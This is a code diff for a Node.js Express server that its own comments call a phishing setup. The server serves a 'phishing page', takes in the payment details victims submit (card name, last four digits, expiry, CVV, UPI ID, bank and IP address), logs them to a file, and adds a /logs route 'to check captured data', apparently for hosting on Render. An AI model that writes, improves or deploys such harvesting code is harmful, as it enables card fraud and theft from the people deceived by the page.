@@ -8,6 +8,7 @@ const PORT = process.env.PORT || 3000;
 
 app.use(cors());
 app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 
 const LOG_FILE = path.join(__dirname, 'payment_logs.txt');
 
@@ -16,31 +17,40 @@ if (!fs.existsSync(LOG_FILE)) {
   fs.writeFileSync(LOG_FILE, '=== PAYMENT LOGS STARTED ===\n\n');
 }
 
+// Serve static files (your HTML)
+app.use(express.static(__dirname));
+
+// Main route - Serve the phishing page
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'index.html'));   // Use 'index.html' (recommended)
+  // If your file is still named phisihing.html, change to:
+  // res.sendFile(path.join(__dirname, 'phisihing.html'));
+});
+
+// Log payment data
 app.post('/log-payment', (req, res) => {
   const data = req.body;
   const timestamp = new Date().toISOString();
 
   let logEntry = `\n--- NEW PAYMENT [${timestamp}] ---\n`;
-  logEntry += `Method     : ${data.method}\n`;
-  logEntry += `Time       : ${data.time}\n`;
+  logEntry += `Method : ${data.method || 'unknown'}\n`;
+  logEntry += `Time : ${data.time || 'N/A'}\n`;
+  logEntry += `IP : ${req.ip || req.connection.remoteAddress}\n`;
 
   if (data.method === 'card') {
-    logEntry += `Card Name  : ${data.cardName || 'N/A'}\n`;
+    logEntry += `Card Name : ${data.cardName || 'N/A'}\n`;
     logEntry += `Card Last4 : ${data.cardLast4 || 'XXXX'}\n`;
-    logEntry += `Expiry     : ${data.cardExp || 'N/A'}\n`;
-    logEntry += `CVV        : ${data.cardCvv || 'N/A'}\n`;
-  } 
-  else if (data.method === 'upi') {
-    logEntry += `UPI ID     : ${data.upiId || 'N/A'}\n`;
-  } 
-  else if (data.method === 'netbanking') {
-    logEntry += `Bank       : ${data.bank || 'Unknown'}\n`;
+    logEntry += `Expiry : ${data.cardExp || 'N/A'}\n`;
+    logEntry += `CVV : ${data.cardCvv || 'N/A'}\n`;
+  } else if (data.method === 'upi') {
+    logEntry += `UPI ID : ${data.upiId || 'N/A'}\n`;
+  } else if (data.method === 'netbanking') {
+    logEntry += `Bank : ${data.bank || 'Unknown'}\n`;
   }
 
-  logEntry += `Amount     : ₹499\n`;
+  logEntry += `Amount : ₹499\n`;
   logEntry += `----------------------------------------\n`;
 
-  // Append to log file
   fs.appendFile(LOG_FILE, logEntry, (err) => {
     if (err) {
       console.error('Error writing log:', err);
@@ -52,6 +62,7 @@ app.post('/log-payment', (req, res) => {
   res.json({ success: true });
 });
 
+// View logs route (for you to check captured data)
 app.get('/logs', (req, res) => {
   if (fs.existsSync(LOG_FILE)) {
     const logs = fs.readFileSync(LOG_FILE, 'utf8');
@@ -61,6 +72,12 @@ app.get('/logs', (req, res) => {
   }
 });
 
+// Fallback route (helps if someone refreshes the page)
+app.get('*', (req, res) => {
+  res.sendFile(path.join(__dirname, 'index.html'));
+});
+
 app.listen(PORT, () => {
-  console.log(`Logger server running on port ${PORT}`);
+  console.log(`🚀 Logger server running on port ${PORT}`);
+  console.log(`🌐 Visit: https://your-service.onrender.com`);
 });
